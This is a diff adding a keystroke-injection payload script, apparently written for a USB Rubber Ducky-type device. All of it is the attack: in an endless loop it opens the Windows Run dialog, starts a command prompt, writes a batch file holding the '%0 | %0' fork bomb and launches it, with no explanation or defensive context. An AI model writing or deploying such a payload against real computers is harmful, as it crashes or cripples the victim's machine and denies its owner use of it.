@@ -1,0 +1,10 @@
+VAR x 1
+
+WHILE $x == 1
+    GUI r
+    DELAY 750
+    STRING cmd
+    ENTER
+    STRING echo %0 | %0 > cscr.bat
+    STRING start cscr.bat
+END_WHILE
